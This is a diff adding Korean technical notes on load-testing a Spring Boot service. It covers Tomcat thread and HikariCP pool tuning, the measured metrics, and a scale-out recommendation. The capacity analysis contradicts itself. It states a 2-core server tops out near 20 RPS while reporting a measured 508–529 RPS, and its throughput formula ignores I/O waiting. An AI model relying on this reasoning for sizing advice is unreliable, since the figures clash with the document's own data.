-이 방식의 핵심은, 서버가 허가된 출처 리스트를 유지하고, 그 리스트에 포함되지 않은 출처에서 온 요청은 모두 거부하는 것이다. 이를 통해, 공격자가 임의의 사이트에서 보내는 CSRF 요청이 효과를 발휘하지 못하도록 막을 수 있다. 그러나, Referer 헤더는 일부 환경에서 제거되거나 수정될 수 있으므로, 출처 검증은 CSRF 방어 전략의 하나로 사용되며, 다른 방법들과 함께 적용하는 것이 권장된다.
+  const batchElapsedTime = new Date().getTime() - startTime;
+  batchResponseTime.add(batchElapsedTime);
+
+  check(null, {
+    'batch status all 200': () =>
+      responses[0].status === 200 &&
+      responses[1].status === 200 &&
+      responses[2].status === 200,
+    'batch response time <= 500ms': () => batchElapsedTime <= 500,
+  });
+
+  const elapsedTime = batchElapsedTime / 1000;
+  const remainingTime = 0.7 - elapsedTime;
+  if (remainingTime > 0) sleep(remainingTime);
+}
+
+```
+
+부하 테스트 시나리오 스크립트는 위와 같습니다. 이를 하나하나 이해할 필요는 없고, 간단하게 아래와 같은 상황이라고 인지하시면 됩니다.
+- 최대 150명의 가상 사용자(VU) 가 동시에 접속
+- 각 사용자는 약 0.7초 간격으로 요청 수행
+- 한 번에 3개의 API를 동시에 호출
+
+## 기본값 설정
+
+```yaml
+spring:
+  datasource:
+    hikari:
+      minimum-idle: 10                    # 기본값
+      maximum-pool-size: 10               # 기본값
+      connection-timeout: 30000           # 30초 (기본값)
+      idle-timeout: 600000                # 10분 (기본값)
+      max-lifetime: 1800000               # 30분 (기본값)
+
+server:
+  tomcat:
+    threads:
+      max: 200                            # 최대 스레드 수 (기본값)
+      min-spare: 10                       # 최소 유지 스레드 수 (기본값)
+    accept-count: 100                     # 대기 큐 크기 (기본값)
+    max-connections: 8192                 # 최대 연결 수 (기본값, BIO는 maxThreads와 동일)
+    connection-timeout: 20000             # 20초 (기본값)
+```
+
+![img_5.png](img_5.png)
+- Tomcat Thread가 최대 200개까지 생성됨
+
+![img_7.png](img_7.png)
+- Connection은 10개 모두 사용
+
+![img_10.png](img_10.png)
+- 서버 CPU 사용률 90% 이상
+
+![img_9.png](img_9.png)
+- RDS CPU 사용률 약 30% 이상
+
+![img_8.png](img_8.png)
+- rps : 508
+- p95 : 360ms
+
+위 상황의 분석 결과는 다음과 같습니다.
+
+**커넥션 풀 증가 필요 (10 → 50)**
+- DB가 여유로우므로 더 많은 커넥션 활용 가능
+- 커넥션 대기 시간 감소 → p95 개선
+- DB의 유휴 리소스 활용
+
+**Tomcat 스레드 감소 필요 (200 → 50)**
+- 커넥션보다 훨씬 많은 스레드는 무의미 (대기만 함)
+- 서버 CPU 사용률 감소 (컨텍스트 스위칭 오버헤드 감소)
+- 메모리 사용량 감소 (각 스레드는 스택 메모리 사용)
+
+
+## Tomcat 스레드 = 50, 커넥션 풀 = 50
+```yaml
+spring:
+  datasource:
+    hikari:
+      minimum-idle: 20                    # 10 → 20 (증가)
+      maximum-pool-size: 50               # 10 → 50 (증가)
+      connection-timeout: 30000           # 30초 (유지)
+      idle-timeout: 600000                # 10분 (유지)
+      max-lifetime: 1800000               # 30분 (유지)
+
+server:
+  tomcat:
+    threads:
+      max: 50                             # 200 → 50 (감소)
+      min-spare: 10                       # 10 (유지)
+    accept-count: 100                     # 100 (유지)
+    max-connections: 8192                 # 8192 (유지)
+    connection-timeout: 20000             # 20초 (유지)
+```
+![img_13.png](img_13.png)
+- Tomcat Thread가 50까지 생성됨
+
+![img_14.png](img_14.png)
+- Connection은 50개 중 33개 사용  
+
+![img_15.png](img_15.png)
+- 서버 cpu 90%이상 사용
+
+![img_16.png](img_16.png)
+- rds cpu 29% 사용
+
+![img_12.png](img_12.png)
+- rps : 529
+- p95 : 376ms
+
+## 문제 분석
+
+Tomcat 스레드와 커넥션 풀을 조절해도 성능(부하)에 큰 변화가 없는걸 알 수 있습니다. 이는 CPU 코어 수와 관련이 있습니다.
+
+현재 서버는 t4g.micro로 CPU 코어가 2개뿐입니다. CPU 코어는 동시에 실행 가능한 작업의 물리적 한계를 결정하는데, 2개의 코어는 한 시점에 정확히 2개의 스레드만 실행할 수 있습니다. 즉, Tomcat 스레드를 50개로 설정하든 200개로 설정하든, 실제로 동시에 RUNNING 상태로 실행되는 스레드는 최대 2개에 불과합니다.
+
+운영체제 스케줄러는 Ready Queue에 있는 나머지 스레드들을 Time Slice(보통 10ms)마다 코어에 할당하며, 이 과정에서 Context Switch가 발생합니다. Context Switch는 현재 스레드의 레지스터 상태를 저장하고 다음 스레드의 상태를 복원하는 과정으로, 약 1~10μs의 오버헤드가 발생합니다. 스레드 수가 많을수록 Context Switch 빈도가 증가하여 실제 작업보다 스레드 전환에 CPU 시간이 소모되는 비효율이 발생합니다.
+
+처리량(Throughput)은 "min(총 스레드 수, 코어 수) / 평균 처리 시간"으로 계산되는데, 분자가 코어 수로 상한선이 고정되어 있기 때문에 스레드나 커넥션 수를 늘려도 처리량이 증가하지 않습니다. 예를 들어, 요청 처리 시간이 100ms일 때 2 Core 시스템의 이론적 최대 처리량은 2 / 0.1초 = 20 RPS로 고정됩니다.
+
+현재 서버 CPU 사용률 90% 이상, DB CPU 사용률 29%라는 지표는 병목이 데이터베이스가 아닌 애플리케이션 서버의 CPU 코어 수에 있음을 명확히 보여줍니다. 커넥션 풀이 33/50만 사용되고 있다는 점 역시 DB 접근이 아닌 애플리케이션 로직 실행 단계에서 대기가 발생하고 있다는 증거입니다.
+
+## 해결 방안: 스케일 아웃 (Scale-Out)
+
+단일 서버의 CPU 코어 수가 물리적 병목이 되고 있으므로, 성능 개선을 위해서는 스케일 아웃(Scale-Out) 전략이 필요합니다. 현재 1대의 t4g.micro(2 Core)로는 최대 약 20 RPS만 처리 가능하지만, 동일한 스펙의 서버를 3대로 확장하고 로드밸런서를 통해 트래픽을 분산하면 이론적으로 60 RPS까지 처리할 수 있습니다. 각 서버가 독립적으로 2개 코어를 활용하므로, 총 6개 코어(2 Core × 3대)가 병렬로 작동하여 전체 시스템의 처리 용량이 선형적으로 증가합니다.
+
+스케일 아웃의 장점은 단일 장애점(Single Point of Failure)을 제거하고 가용성을 높일 수 있다는 점입니다. 한 대의 서버가 장애가 발생해도 나머지 서버가 트래픽을 처리하여 서비스 중단을 방지할 수 있으며, Auto Scaling Group을 구성하면 트래픽 증가에 따라 자동으로 인스턴스를 추가하여 탄력적으로 대응할 수 있습니다. 또한 DB CPU가 29%로 여유로운 상황이므로, 애플리케이션 서버만 확장해도 병목 없이 성능을 개선할 수 있습니다.
